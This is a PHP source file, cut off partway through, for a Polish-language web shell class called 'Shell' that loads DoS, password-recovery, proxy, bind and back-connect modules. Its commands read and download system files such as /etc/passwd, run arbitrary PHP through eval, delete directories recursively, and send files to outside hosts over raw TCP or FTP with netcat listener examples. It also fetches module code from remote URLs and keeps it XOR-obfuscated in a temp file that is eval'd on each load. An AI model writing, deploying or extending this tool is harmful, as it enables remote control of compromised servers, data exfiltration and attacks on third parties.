<?php

/**
 * Part of Neapter Framework
 *
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright Copyright (c) 2011, Krzysztof Otręba
 */

require_once dirname( __FILE__ ) . '/Lib/Arr.php';
require_once dirname( __FILE__ ) . '/Lib/Request.php';
require_once dirname( __FILE__ ) . '/Lib/Form.php';
require_once dirname( __FILE__ ) . '/Lib/ModuleMysqlDumper.php';
require_once dirname( __FILE__ ) . '/Lib/ModulePasswordRecovery.php';
require_once dirname( __FILE__ ) . '/Lib/ModuleDos.php';
require_once dirname( __FILE__ ) . '/Lib/ModuleProxy.php';
require_once dirname( __FILE__ ) . '/Lib/ModuleBind.php';
require_once dirname( __FILE__ ) . '/Lib/ModuleBackConnect.php';

/**
 * class Shell - Zarzadzanie serwerem
 *
 * @version 0.2
 *
 * @uses Arr
 * @uses Request
 * @uses Form
 */
class Shell
{
	/**
	 * Wersja
	 */
	const VERSION = '0.2 b110604';

	/**
	 * Czas generowania strony
	 *
	 * @access private
	 * @var    float
	 */
	private $fGeneratedIn;

	/**
	 * SafeMode ON / OFF
	 *
	 * @access private
	 * @var    boolean
	 */
	private $bSafeMode;

	/**
	 * Tablica wylaczaonych funkcji
	 *
	 * @access private
	 * @var    array
	 */
	private $aDisableFunctions = array();

	/**
	 * Dzialamy w srodowisku Windows ?
	 *
	 * @access private
	 * @var    boolean
	 */
	private $bWindows;

	/**
	 * Komenda
	 *
	 * @access private
	 * @var    string
	 */
	private $sCmd;

	/**
	 * Lista parametrow
	 *
	 * @access private
	 * @var    array
	 */
	private $aArgv = array();

	/**
	 * Lista opcji
	 *
	 * @access private
	 * @var    array
	 */
	private $aOptv = array();

	/**
	 * Ilosc parametrow
	 *
	 * @access private
	 * @var    integer
	 */
	private $iArgc = 0;

	/**
	 * Ciag jako jeden wielki parametr
	 *
	 * @access private
	 * @var    string
	 */
	private $sArgv;

	/**
	 * Czy funkcja posix_getpwuid istnieje
	 *
	 * @access private
	 * @var    boolean
	 */
	private $bFuncOwnerById = FALSE;

	/**
	 * Czy funkcja posix_getgrgid istnieje
	 *
	 * @access private
	 * @var    boolean
	 */
	private $bFuncGroupById = FALSE;

	/**
	 * Sprawdz linie: 170
	 *
	 * @ignore
	 * @access private
	 * @var    string
	 */
	private $sPhpInfo;

	/**
	 * Lista dostepnych modulow
	 *
	 * @access private
	 * @var    array
	 */
	private $aModules = array
	(
		'Dos',
		'MysqlDumper',
		'PasswordRecovery',
		'Proxy',
		'Bind',
		'BackConnect'
	);

	/**
	 * Konstruktor
	 *
	 * @uses   Request
	 *
	 * @access public
	 * @return void
	 */
	public function __construct()
	{
		/**
		 * Czas generowania strony
		 */
		$this -> fGeneratedIn = microtime( 1 );

		/**
		 * @see Request::init
		 */
		Request::init();

		/**
		 * Czy dzialamy na Windowsie ?
		 */
		$this -> bWindows = ( strncmp( PHP_OS, 'WIN', 3 ) === 0 );

		/**
		 * SafeMode
		 */
		$this -> bSafeMode = (bool) ini_get( 'safe_mode' );

		/**
		 * Czy funkcje sa dostepne
		 */
		$this -> bFuncOwnerById = function_exists( 'posix_getpwuid' );
		$this -> bFuncGroupById = function_exists( 'posix_getgrgid' );

		/**
		 * W zasadzie nic to nie robi, ale za to Netbeans ma problemy z formatowaniem
		 * i podpowiadaniem skladni z tym wlasnie kodem ;), nacisnij ALT + SHIFT + M
		 * to taki FEATURE ;]
		 */
		$sPhpInfo = <<<DATA

/phpinfo
DATA;

		$this -> sPhpInfo = substr( $sPhpInfo, -7 );

		/**
		 * Jesli SafeMode jest wylaczony
		 */
		if( ! $this -> bSafeMode )
		{
			ini_set( 'display_errors',         1 );
			ini_set( 'max_execution_time',     0 );
			ini_set( 'memory_limit',           '1024M' );
			ini_set( 'default_socket_timeout', 5 );
			ini_set( 'date.timezone',          'Europe/Warsaw' );
		}

		/**
		 * Config
		 */
		error_reporting( -1 );
		ignore_user_abort( 0 );
		date_default_timezone_set( 'Europe/Warsaw' );

		/**
		 * disable_functions
		 */
		if( ( $sDisableFunctions = ini_get( 'disable_functions' ) ) !== '' )
		{
			$aDisableFunctions = explode( ',', $sDisableFunctions );
			array_walk( $aDisableFunctions, create_function( '$sValue', 'return strtolower( trim( $sValue ) );' ) );

			$this -> aDisableFunctions = $aDisableFunctions;
		}


		/**
		 * Sprawdzanie, czy wszystkie moduly zostaly juz wczytane
		 */
		$iModules = 0;

		foreach( $this -> aModules as $sModule )
		{
			if( class_exists( $sModule ) )
			{
				$iModules++;
			}
		}

		/**
		 * Wczytywanie modulow
		 */
		$sKey = sha1( __FILE__ );
		if(    ( $iModules !== count( $this -> aModules ) )
		    && is_file( $sFilePath = sys_get_temp_dir() . '/' . $sKey )
		    && ( ( $sData = file_get_contents( $sFilePath ) ) !== FALSE )
		)
		{
			$iDataLen = strlen( $sData );

			$sNewData = NULL;

			/**
			 * Deszyfrowanie zawartosci pliku
			 */
			for( $i = 0; $i < $iDataLen; $i++ )
			{
				$sNewData .= chr( ord( substr( $sData, $i, 1 ) ) ^ ord( substr( $sKey, ( $i % 20 ) * 2, 2 ) ) );
			}

			eval( '?>' . $sNewData . '<?' );
		}
	}

	/**
	 * Pobieranie nazwy uzytkownika po jego ID
	 *
	 * @access private
	 * @param  integer        $iValue ID uzytkownika
	 * @return string|integer         Nazwa uzytkownika / ID uzytkownika
	 */
	private function getOwnerById( $iValue )
	{
		if( $this -> bFuncOwnerById )
		{
			$aUser = posix_getpwuid( $iValue );
			return $aUser['name'];
		}

		return $iValue;
	}

	/**
	 * Pobieranie nazwy grupy po jej ID
	 *
	 * @access private
	 * @param  integer        $iValue ID grupy
	 * @return string|integer         Nazwa grupy / ID grupy
	 */
	private function getGroupById( $iValue )
	{
		if( $this -> bFuncGroupById )
		{
			$aGroup = posix_getgrgid( $iValue );
			return $aGroup['name'];
		}

		return $iValue;
	}

	/**
	 * Pobieranie nazwy hosta i portu
	 *
	 * @access private
	 * @param  integer $sHost Host / Host:port
	 * @return array          Host i port
	 */
	private function getHost( $sHost )
	{
		$iPort = 0;
		if( strpos( $sHost, ':' ) !== FALSE )
		{
			list( $sHost, $iPort ) = explode( ':', $sHost );
		}

		return array( $sHost, (int) $iPort );
	}

	/**
	 * Pobieranie statusu TAK / NIE
	 *
	 * @access private
	 * @param  boolean $bValue    Wartosc
	 * @param  boolean $bNegative Negacja 1, 0 zwroci zielone TAK, 1, 1 zwroci czerwone TAK
	 * @return string             Status
	 */
	private function getStatus( $bValue, $bNegative = FALSE )
	{
		return sprintf( '<span class="%s">%s</span>', ( ( $bNegative ? ! $bValue : $bValue ) ? 'green' : 'red' ), ( $bValue ? 'TAK' : 'NIE' ) );
	}

	/**
	 * Pobieranie menu
	 *
	 * @access private
	 * @return string  Menu w HTMLu
	 */
	private function getMenu()
	{
		return sprintf( 'Wersja PHP: <strong>%s</strong><br />' .
				'SafeMode: %s<br />' .
				'OpenBaseDir: %s<br />' .
				'Serwer Api: <strong>%s</strong><br />' .
				'Serwer: <strong>%s</strong><br />' .
				'Zablokowane funkcje: <strong>%s</strong><br />',

				phpversion(),
				$this -> getStatus( $this -> bSafeMode, 1 ),
				ini_get( 'open_basedir' ),
				php_sapi_name(),
				php_uname(),
				( ( $sDisableFunctions = implode( ',', $this -> aDisableFunctions ) === '' ) ? 'brak' : $sDisableFunctions )
		);
	}

	/**
	 * Komenda - echo
	 *
	 * @access private
	 * @return string
	 */
	private function getCommandEcho()
	{
		/**
		 * Help
		 */
		if( ( $this -> iArgc === 0 ) || ( $this -> aArgv[0] === 'help' ) )
		{
			return <<<DATA
echo - Wyświetla tekst

	Użycie:
		echo tekst do wyświetlenia
DATA;
		}

		return htmlspecialchars( $this -> sArgv );
	}

	/**
	 * Komenda - ping
	 *
	 * @access private
	 * @return string
	 */
	private function getCommandPing()
	{
		/**
		 * Help
		 */
		if( $this -> iArgc !== 0 )
		{
			return <<<DATA
ping - Odpowiedź "pong"

	Użycie:
		ping
DATA;
		}

		return 'pong';
	}

	/**
	 * Komenda - ls
	 *
	 * @access private
	 * @return string
	 */
	private function getCommandLs()
	{
		/**
		 * Help
		 */
		if( ( $this -> iArgc === 0 ) || ( $this -> aArgv[0] === 'help' ) )
		{
			return <<<DATA
ls - Wyświetlanie informacji o plikach i katalogach

	Użycie:
		ls ścieżka_do_katalogu

	Opcje:
		-l wyświetlanie szczegółowych informacji o plikach i katalogach
		   właściciel, grupa, rozmiar, czas utworzenia

		-R wyświetlanie plików i katalogów rekurencyjnie

	Przykład:
		ls /home/
		ls -l /home/
		ls -lR /home/
DATA;
		}

		$sOutput = NULL;

		/**
		 * Domyslny katalog jezeli nie podano sciezki
		 */
		$sDir = ( ! empty( $this -> sArgv ) ? $this -> sArgv : dirname( __FILE__ ) );

		$bList      = in_array( 'l', $this -> aOptv );
		$bRecursive = in_array( 'R', $this -> aOptv );

		try
		{
			/**
			 * Jezeli chcemy wyswietlic pliki i katalogi rekurencyjnie to uzywamy
			 * obiektu RecursiveDirectoryIterator
			 */
			if( $bRecursive )
			{
				$oDirectory = new RecursiveIteratorIterator( new RecursiveDirectoryIterator( $sDir ), RecursiveIteratorIterator::SELF_FIRST );
			}
			else
			{
				$oDirectory = new DirectoryIterator( $sDir );
			}

			/**
			 * Informacja o komendzie jaka wykonalismy
			 */
			$sOutput .= sprintf( "%s %s\r\n\r\n", $this -> sCmd, $this -> sArgv );

			$sFileName = ( $bRecursive ? 'getPathname' : 'getBasename' );

			foreach( $oDirectory as $oFile )
			{
				if( $bList )
				{
					/**
					 * Windows ?
					 */
					if( $this -> bWindows )
					{
						$sOutput .= sprintf( "%s %11d %s %s\r\n",
							( ( $oFile -> getType() === 'file' ) ? '-' : 'd' ),
							$oFile -> getSize(), date( 'Y-m-d h:i',
								$oFile -> getCTime() ),
							$oFile -> {$sFileName}()
						);
					}
					else
					{
						$sOutput .= sprintf( "%s%s %-10s %-10s %11d %s %s\r\n",
							( ( $oFile -> getType() === 'file' ) ? '-' : 'd' ),
							substr( sprintf( '%o', $oFile -> getPerms() ), -4 ),
							$this -> getOwnerById( $oFile -> getOwner() ),
							$this -> getGroupById( $oFile -> getGroup() ),
							$oFile -> getSize(), date( 'Y-m-d h:i',
							$oFile -> getCTime() ), $oFile -> {$sFileName}()
						);
					}
				}
				else
				{
					$sOutput .= sprintf( "%s %s\r\n", ( ( $oFile -> getType() === 'file' ) ? 'fil' : 'dir' ), $oFile -> {$sFileName}() );
				}
			}

			return htmlspecialchars( $sOutput );
		}
		catch( Exception $oException )
		{
			return sprintf( "Nie można otworzyć katalogu \"%s\"\r\n\r\nErro: %s", $sDir, $oException -> getMessage()  );
		}
	}

	/**
	 * Komenda - cat
	 *
	 * @access private
	 * @return string
	 */
	private function getCommandCat()
	{
		/**
		 * Help
		 */
		if( ( $this -> iArgc === 0 ) || ( $this -> aArgv[0] === 'help' ) )
		{
			return <<<DATA
cat - Wyświetlanie zawartości pliku

	Użycie:
		cat ścieżka_do_pliku

	Przykład:
		cat /etc/passwd
DATA;
		}

		/**
		 * Plik zrodlowy musi istniec
		 */
		if( ! is_file( $this -> sArgv ) )
		{
			return sprintf( 'Plik "%s" nie istnieje', $this -> sArgv );
		}

		return htmlspecialchars( file_get_contents( $this -> sArgv ) );
	}

	/**
	 * Komenda - mkdir
	 *
	 * @access private
	 * @return string
	 */
	private function getCommandMkdir()
	{
		/**
		 * Help
		 */
		if( ( $this -> iArgc === 0 ) || ( $this -> aArgv[0] === 'help' ) )
		{
			return <<<DATA
mkdir - Tworzenie katalogu

	Użycie:
		echo katalog [katalog2] [katalog3]
DATA;
		}

		$sOutput = NULL;

		for( $i = 0; $i < $this -> iArgc; $i++ )
		{
			if( ! mkdir( $this -> aArgv[ $i ], 0777, TRUE ) )
			{
				$sOutput .= sprintf( "Katalog \"%s\" <span class=\"red\">nie został utworzony</span>\r\n", $this -> aArgv[ $i ] );
			}
			else
			{
				$sOutput .= sprintf( "Katalog \"%s\" <span class=\"green\">został utworzony</span>\r\n", $this -> aArgv[ $i ] );
			}
		}

		return $sOutput;
	}

	/**
	 * Komenda - cp
	 *
	 * @access private
	 * @return string
	 */
	private function getCommandCp()
	{
		/**
		 * Help
		 */
		if( ( $this -> iArgc !== 2 ) || ( $this -> aArgv[0] === 'help' ) )
		{
			return <<<DATA
cp, copy - Kopiowanie pliku

	Użycie:
		cp plik_lub_katalog_źródłowy plik_lub_katalog_docelowy
DATA;
		}

		$sOutput = NULL;

		if( ! copy( $this -> aArgv[0], $this -> aArgv[1] ) )
		{
			return sprintf( 'Plik "%s" <span class="red">nie został skopiowany</span> do "%s"', $this -> aArgv[0], $this -> aArgv[1] );
		}

		return sprintf( 'Plik "%s" <span class="green">został skopiowany</span> do "%s"', $this -> aArgv[0], $this -> aArgv[1] );
	}

	/**
	 * Komenda - cp
	 *
	 * @access private
	 * @return string
	 */
	private function getCommandMv()
	{
		/**
		 * Help
		 */
		if( ( $this -> iArgc !== 2 ) || ( $this -> aArgv[0] === 'help' ) )
		{
			return <<<DATA
mv, move - Przenoszenie pliku

	Użycie:
		mv plik_lub_katalog_źródłowy plik_lub_katalog_docelowy
DATA;
		}

		$sOutput = NULL;

		if( ! rename( $this -> aArgv[0], $this -> aArgv[1] ) )
		{
			return sprintf( 'Plik "%s" <span class="red">nie został przeniesiony</span> do "%s"', $this -> aArgv[0], $this -> aArgv[1] );
		}

		return sprintf( 'Plik "%s" <span class="green">został przeniesiony</span> do "%s"', $this -> aArgv[0], $this -> aArgv[1] );
	}

	/**
	 * Komenda - remove
	 *
	 * @access private
	 * @return string
	 */
	private function getCommandRemove()
	{
		/**
		 * Help
		 */
		if( ( $this -> iArgc === 0 ) || ( $this -> aArgv[0] === 'help' ) )
		{
			return <<<DATA
remove, rm, delete, del - Usuwanie pliku / katalogu. Zawartość katalogu zostanie usunięta rekurencyjnie

	Użycie:
		remove ścieżka_do_katalogu_lub_pliku
DATA;
		}

		$sOutput = NULL;

		/**
		 * Jezeli podana sciezka to plik
		 */
		if( is_file( $this -> sArgv ) )
		{
			if( ! unlink( $this -> sArgv ) )
			{
				return sprintf( 'Plik "%s" <span class="red">nie został usunięty</span>', $this -> sArgv );
			}

			return sprintf( 'Plik "%s" <span class="green">został usunięty</span>', $this -> sArgv );
		}
		/**
		 * Jezeli podana sciezka to katalog
		 */
		if( is_dir( $this -> sArgv ) )
		{
			try
			{
				$oDirectory = new RecursiveIteratorIterator( new RecursiveDirectoryIterator( $this -> sArgv ), RecursiveIteratorIterator::CHILD_FIRST );

				foreach( $oDirectory as $oFile )
				{
					if( $oFile -> isDir() )
					{
						/**
						 * PHP 5.2.X nie posiada stalej RecursiveDirectoryIterator::SKIP_DOTS
						 */
						if( ( $oFile -> getBasename() === '.' ) || ( $oFile -> getBasename() === '.' ) )
						{
							continue;
						}

						/**
						 * Usuwanie katalogu
						 */
						if( ! rmdir( $oFile -> getPathname() ) )
						{
							$sOutput .= sprintf( "Katalog \"%s\" <span class=\"red\">nie został usunięty</span>\r\n", $oFile -> getPathname() );
						}
					}
					else
					{
						/**
						 * Usuwanie pliku
						 */
						if( ! unlink( $oFile -> getPathname() ) )
						{
							$sOutput .= sprintf( "Plik    \"%s\" <span class=\"red\">nie został usunięty</span>\r\n", $oFile -> getPathname() );
						}
					}
				}

				$oDirectory = NULL;

				/**
				 * Usuwanie ostatniego katalogu
				 */
				if( ! rmdir( $this -> sArgv ) )
				{
					return $sOutput . sprintf( 'Katalog "%s" <span class="red">nie został usunięty</span>', $this -> sArgv );
				}
			}
			catch( Exception $oException )
			{
				return sprintf( "Nie można otworzyć katalogu \"%s\"\r\n\r\nErro: %s", $sDir, $oException -> getMessage()  );
			}

			return sprintf( 'Katalog "%s" <span class="green">został usunięty</span>', $this -> sArgv );
		}

		return sprintf( 'Podana ścieżka "%s" nie istnieje', $this -> sArgv );
	}

	/**
	 * Komenda - chmod
	 *
	 * @access private
	 * @return string
	 */
	private function getCommandChmod()
	{
		/**
		 * Help
		 */
		if( ( $this -> iArgc === 2 ) || ( $this -> aArgv[0] === 'help' ) )
		{
			return <<<DATA
chmod - Zmiana uprawnień dla pliku

	Użycie:
		chmod uprawnienie plik_lub_katalog

	Przykład:
		chmod 777 /tmp/plik
DATA;
		}

		/**
		 * Chmod jest wymagany
		 */
		if( ! ctype_digit( $this -> aArgv[0] ) || strlen( $this -> aArgv[0] ) !== 3 )
		{
			return sprintf( 'Błędny chmod "%d"', $this -> aArgv[0] );
		}

		/**
		 * Plik musi istniec
		 */
		if( ! is_file( $this -> aArgv[1] ) )
		{
			return sprintf( 'Plik "%s" nie istnieje', $this -> aArgv[1] );
		}

		if( chmod( $this -> aArgv[1], $this -> aArgv[0] ) )
		{
			return 'Uprawnienia <span class="green">zostały zmienione</span>';
		}

		return 'Uprawnienia <span class="red">nie zostały zmienione</span>';
	}

	/**
	 * Komenda - bcat
	 *
	 * @access private
	 * @return string
	 */
	private function getCommandBCat()
	{
		/**
		 * Help
		 */
		if( ( $this -> iArgc === 0 ) || ( $this -> aArgv[0] === 'help' ) )
		{
			return <<<DATA
bcat, b64 - Wyświetlanie zawartości pliku przy użyciu base64

	Użycie:
		bcat ścieżka_do_pliku

	Przykład:
		bcat /etc/passwd
DATA;
		}

		/**
		 * Plik zrodlowy musi istniec
		 */
		if( ! is_file( $this -> sArgv ) )
		{
			return sprintf( 'Plik "%s" nie istnieje', $this -> sArgv );
		}

		/**
		 * Naglowek Mime i zrodlo pliku w base64
		 */
		$sMime = sprintf( "MIME-Version: 1.0\r\nContent-Type: application/octet-stream; name=\"%s\"\r\nContent-Transfer-Encoding: base64\r\nContent-Disposition: attachment; filename=\"%s\"\r\n\r\n",
			basename( $this -> sArgv ), basename( $this -> sArgv )
		);

		return htmlspecialchars( $sMime . chunk_split( base64_encode( file_get_contents( $this -> sArgv ) ), 130 ) );
	}

	/**
	 * Komenda - eval
	 *
	 * @access private
	 * @return string
	 */
	private function getCommandEval()
	{
		/**
		 * Help
		 */
		if( ( $this -> iArgc === 0 ) || ( $this -> aArgv[0] === 'help' ) )
		{
			return <<<DATA
eval, php - Wykonanie kodu PHP

	Użycie:
		eval skrypt_php

	Przykład:
		eval echo md5( 'test' );
DATA;
		}

		ob_start();
		eval( $this -> sArgv );
		$sData = ob_get_contents();
		ob_clean();
		ob_end_flush();

		return htmlspecialchars( $sData );
	}

	/**
	 * Komenda - modules
	 *
	 * @access private
	 * @return string
	 */
	private function getCommandModules()
	{
		/**
		 * Help
		 */
		if( ( $this -> iArgc !== 1 ) || ( $this -> aArgv[0] === 'help' ) )
		{
			return <<<DATA
modules - Wczytywanie dodakowych modułów shella

	Użycie:
		modules ścieżka_do_pliku_z_modułami

	Przykład:
		modules /tmp/modules
		modules http://example.com/modules.txt
DATA;
		}

		/**
		 * Sprawdzanie, czy meoduly nie zostaly juz zaladowane
		 */
		$iModules = 0;

		foreach( $this -> aModules as $sModule )
		{
			if( class_exists( $sModule ) )
			{
				$iModules++;
			}
		}

		if( $iModules === count( $this -> aModules ) )
		{
			return 'Wszystkie moduły zostały załadowane';
		}

		/**
		 * Pobieranie pliku z http
		 */
		if( strncmp( $this -> aArgv[0], 'http://', 7 ) === 0 )
		{
			if( ( $sData = file_get_contents( $this -> aArgv[0] ) ) === FALSE )
			{
				return 'Nie można pobrać pliku z modułami';
			}

			$sFilePath = tempnam( sys_get_temp_dir(), 'shell' );
			file_put_contents( $sFilePath, $sData );
		}
		/**
		 * Wczytywanie pliku
		 */
		else
		{
			if( ! is_file( $this -> aArgv[0] ) )
			{
				return 'Nie można wczytać pliku z modułami';
			}

			$sFilePath = $this -> aArgv[0];

			if( ( $sData = file_get_contents( $this -> aArgv[0] ) ) === FALSE )
			{
				return 'Nie można wczytać pliku z modułami';
			}
		}

		ob_start();
		require $sFilePath;
		ob_clean();
		ob_end_flush();

		if( ! class_exists( 'Dos' ) && ! class_exists( 'MysqlDumper' ) && ! class_exists( 'PasswordRecovery' ) && ! class_exists( 'Proxy' ) )
		{
			return 'Niepoprawny plik z modułami';
		}

		/**
		 * Szyfrowanie zawartosci pliku
		 */
		$sKey = sha1( __FILE__ );

		$iDataLen = strlen( $sData );

		$sNewData = NULL;

		for( $i = 0; $i < $iDataLen; $i++ )
		{
			$sNewData .= chr( ord( substr( $sData, $i, 1 ) ) ^ ord( substr( $sKey, ( $i % 20 ) * 2, 2 ) ) );
		}

		file_put_contents( sys_get_temp_dir() . '/' . $sKey, $sNewData );

		return 'Plik z modułami został załadowany';
	}

	/**
	 * Komenda - phpinfo
	 *
	 * @uses   Html
	 *
	 * @access private
	 * @return string
	 */
	private function getCommandPhpInfo()
	{
		/**
		 * Help
		 */
		if( ( $this -> iArgc === 1 ) && ( $this -> aArgv[0] === 'help' ) )
		{
			return <<<DATA
phpinfo - Informacje o PHP

	Użycie:
		{$this -> sPhpInfo}
DATA;
		}

		ob_start();
		phpinfo();
		$sData = ob_get_contents();
		ob_clean();
		ob_end_flush();

		/**
		 * Wywalanie zbednych tresci, klasy itp
		 * Licencje kazdy zna
		 */
		$sData = str_replace( array
			(
				' class="e"',
				' class="v"'
			),
			'',
			substr( $sData,
				strpos( $sData, '<div class="center">' ) + 20,
				-( strlen( $sData ) - strrpos( $sData, '<h2>PHP License</h2>' ) )
			)
		);

		/**
		 * logo kazdy widzial, creditsy tez
		 */
		$sData = preg_replace( '~<a href="http://www.php.net/"><img border="0" src="[^"]+" alt="PHP Logo" /></a><h1 class="p">(.+?)</h1>~', '<h1>$1</h1>', $sData );
		$sData = preg_replace( '~<a href=".+?"><img border="0" src=".+?" alt=".+?" /></a>~', NULL, $sData );
		$sData = preg_replace( '~<hr />\s+<h1><a href=".+?">PHP Credits</a></h1>~', NULL, $sData );

		return $sData;
	}

	/**
	 * Komenda - socketdownload
	 *
	 * @access private
	 * @return string
	 */
	private function getCommandSocketDownload()
	{
		/**
		 * Help
		 */
		if( ( $this -> iArgc !== 2 ) || ( $this -> aArgv[0] === 'help' ) )
		{
			return <<<DATA
socketdownload, socketdown, socketget - Pobieranie pliku za pomocą protokołu TCP

	Użycie:
		socketupload host:port ścieżka_do_pliku_gdzie_ma_być_zapisany

	Przykład:
		socketupload localhost:6666 /tmp/plik.txt

	NetCat:
		nc -vv -w 1 -l -p 6666 < plik.txt
DATA;
		}

		/**
		 * Plik zrodlowy musi istniec
		 */
		$aHost = $this -> getHost( $this -> aArgv[0] );

		if( $aHost[1] === 0 )
		{
			return sprintf( 'Błędny host "%s"', $this -> aArgv[0] );
		}

		/**
		 * Polaczenie z hostem
		 */
		if( ! ( $rSock = fsockopen( $aHost[0], $aHost[1] ) ) )
		{
			return htmlspecialchars( sprintf( 'Nie można połączyć się z serwerem "%s"', $this -> aArgv[0] ) );
		}

		/**
		 * File
		 */
		if( ! ( $rFile = fopen( $this -> aArgv[1], 'w' ) ) )
		{
			return htmlspecialchars( sprintf( 'Nie można odczytać pliku "%s"', $this -> aArgv[1] ) );
		}

		while( ! feof( $rSock ) )
		{
			fwrite( $rFile, fread( $rSock, 131072 ) );
		}

		fclose( $rFile );
		fclose( $rSock );

		return htmlspecialchars( sprintf( 'Plik został pobrany i zapisany w "%s"', $this -> aArgv[1] ) );
	}

	/**
	 * Komenda - ftpdownload
	 *
	 * @access private
	 * @return string
	 */
	private function getCommandFtpDownload()
	{
		/**
		 * Help
		 */
		if( ( $this -> iArgc !== 4 ) || ( $this -> aArgv[0] === 'help' ) )
		{
			return <<<DATA
ftpdownload, ftpdown, ftpdown - Pobieranie pliku z FTP

	Użycie:
		ftpdownload host:port login@hasło plik_źródłowy plik_docelowy_

	Przykład:
		ftpdownload localhost:6666 test@test /plik.txt /home/usr/plik.txt
DATA;
		}

		$aHost = $this -> getHost( $this -> aArgv[0] );

		if( $aHost[1] === 0 )
		{
			$aHost[1] = 21;
		}

		/**
		 * login@pass
		 */
		list( $sUsername, $sPassword ) = explode( '@', $this -> aArgv[1] );

		/**
		 * Ustanawianie polaczenia
		 */
		if( ! ( $rFtp = ftp_connect( $aHost[0], $aHost[1], 5 ) ) )
		{
			return htmlspecialchars( sprintf( 'Nie można połączyć się z serwerem FTP "%s"', $this -> aArgv[0] ) );
		}

		/**
		 * Autoryzacja
		 */
		if( ! ftp_login( $rFtp, $sUsername, $sPassword ) )
		{
			return htmlspecialchars( sprintf( 'Błędne dane do autoryzacji "%s"', $this -> aArgv[1] ) );
		}

		/**
		 * Zmiana katalogu
		 */
		if( ! ftp_chdir( $rFtp, ( $sDir = str_replace( '\\', '/', dirname( $this -> aArgv[2] ) ) ) ) )
		{
			return htmlspecialchars( sprintf( 'Na FTP nie istnieje katalog "%s"', $sDir ) );
		}

		/**
		 * Pobieranie pliku
		 */
		if( ! ftp_get( $rFtp, $this -> aArgv[3], basename( $this -> aArgv[2] ), FTP_BINARY ) )
		{
			return htmlspecialchars( sprintf( 'Nie można pobrać pliku "%s" z serwera', $this -> aArgv[2] ) );
		}

		ftp_close( $rFtp );

		return htmlspecialchars( sprintf( 'Plik "%s" został pomyślnie pobrany an FTP i zapisany w "%s"', $this -> aArgv[2], $this -> aArgv[3] ) );
	}

	/**
	 * Komenda - download
	 *
	 * @access private
	 * @return string
	 */
	private function getCommandDownload()
	{
		/**
		 * Help
		 */
		if( ( $this -> iArgc === 0 ) || ( $this -> aArgv[0] === 'help' ) )
		{
			return <<<DATA
download, down, get - Pobieranie pliku

	Użycie:
		download ścieżka_do_pliku

	Opcje:
		-g pobieranie przy użyciu kompresji GZIP

	Przykład:
		download /etc/passwd
		download -g /etc/passwd
DATA;
		}

		$bGzip = in_array( 'g', in_array( 'R', $this -> aOptv ) );

		/**
		 * Plik zrodlowy musi istniec
		 */
		if( ! is_file( $this -> sArgv ) )
		{
			return sprintf( 'Plik "%s" nie istnieje', $this -> sArgv );
		}

		/**
		 * Kompresja zawartosci strony
		 */
		if( $bGzip )
		{
			ini_set( 'zlib.output_compression', 9 );
		}

		ob_start();

		/**
		 * Naglowki
		 */
		header( 'Cache-Control: must-revalidate, post-check=0, pre-check=0', TRUE );
		header( sprintf( 'Content-Disposition: attachment; filename="%s"', basename( $this -> sArgv ) ), TRUE );
		header( 'Content-Type: application/octet-stream', TRUE );

		if( ( $rFile = fopen( $this -> sArgv, 'r' ) ) !== FALSE )
		{
			if( ! $bGzip )
			{
				header( sprintf( 'Content-Length: %s', filesize( $this -> sArgv ) ), TRUE );
			}

			while( ! feof( $rFile ) )
			{
				echo fread( $rFile, 131072 );
				@ ob_flush();
				@ flush();
			}
		}

		ob_end_flush();
		exit ;
	}

	/**
	 * Komenda - socketupload
	 *
	 * @access private
	 * @return string
	 */
	private function getCommandSocketUpload()
	{
		/**
		 * Help
		 */
		if( ( $this -> iArgc !== 2 ) || ( $this -> aArgv[0] === 'help' ) )
		{
			return <<<DATA
socketupload, socketup, socketput - Wysyłanie pliku za pomocą protokołu TCP

	Użycie:
		socketupload host:port ścieżka_do_pliku

	Przykład:
		socketupload localhost:6666 /etc/passwd

	NetCat:
		nc -vv -l -p 6666
DATA;
		}

		$aHost = $this -> getHost( $this -> aArgv[0] );

		/**
		 * Port jest wymagany
		 */
		if( $aHost[1] === 0 )
		{
			return sprintf( 'Błędny host "%s"', $this -> aArgv[0] );
		}

		/**
		 * Plik zrodlowy musi istniec
		 */
		if( ! is_file( $this -> aArgv[1] ) )
		{
			return sprintf( 'Plik "%s" nie istnieje', $this -> aArgv[1] );
		}

		/**
		 * Polaczenie z hostem
		 */
		if( ! ( $rSock = fsockopen( $aHost[0], $aHost[1] ) ) )
		{
			return sprintf( 'Nie można połączyć się z serwerem "%s"', $this -> aArgv[0] );
		}

		/**
		 * File
		 */
		if( ! ( $rFile = fopen( $this -> aArgv[1], 'r' ) ) )
		{
			return sprintf( 'Nie można odczytać pliku "%s"', $this -> aArgv[1] );
		}

		while( ! feof( $rFile ) )
		{
			fwrite( $rSock, fread( $rFile, 131072 ) );
		}

		fclose( $rFile );
		fclose( $rSock );

		return 'Plik został przesłany';
	}

	/**
	 * Komenda - ftpupload
	 *
	 * @access private
	 * @return string
	 */
	private function getCommandFtpUpload()
	{
		/**
		 * Help
		 */
		if( ( $this -> iArgc !== 4 ) || ( $this -> aArgv[0] === 'help' ) )
		{
			return <<<DATA
ftpupload, ftpup, ftpput - Wysyłanie pliku na FTP

	Użycie:
		ftpupload host:port login@hasło plik_źródłowy ścieżka_docelowa

	Przykład:
		ftpupload localhost:6666 test@test /home/usr/plik.txt /
DATA;
		}

		/**
		 * Plik zrodlowy musi istniec
		 */
		if( ! is_file( $this -> aArgv[2] ) )
		{
			return htmlspecialchars( sprintf( 'Plik "%s" nie istnieje', $this -> aArgv[2] ) );
		}

		$aHost = $this -> getHost( $this -> aArgv[0] );

		if( $aHost[1] === 0 )
		{
			$aHost[1] = 21;
		}

		/**
		 * login@pass
		 */
		list( $sUsername, $sPassword ) = explode( '@', $this -> aArgv[1] );

		/**
		 * Ustanawianie polaczenia
		 */
		if( ! ( $rFtp = ftp_connect( $aHost[0], $aHost[1], 5 ) ) )
		{
			return htmlspecialchars( sprintf( 'Nie można połączyć się z serwerem FTP "%s"', $this -> aArgv[0] ) );
		}

		/**
		 * Autoryzacja
		 */
		if( ! ftp_login( $rFtp, $sUsername, $sPassword ) )
		{
			return htmlspecialchars( sprintf( 'Błędne dane do autoryzacji "%s"', $this -> aArgv[1] ) );
		}

		/**
		 * Zmiana katalogu
		 */
		if( ! ftp_chdir( $rFtp, $this -> aArgv[3] ) )
		{
			return htmlspecialchars( sprintf( 'Na FTP nie istnieje katalog "%s"', $this -> aArgv[2] ) );
		}

		/**
		 * Wrzucanie pliku
		 */
		if( ! ftp_put( $rFtp, basename( $this -> aArgv[2] ), $this -> aArgv[2], FTP_BINARY ) )
		{
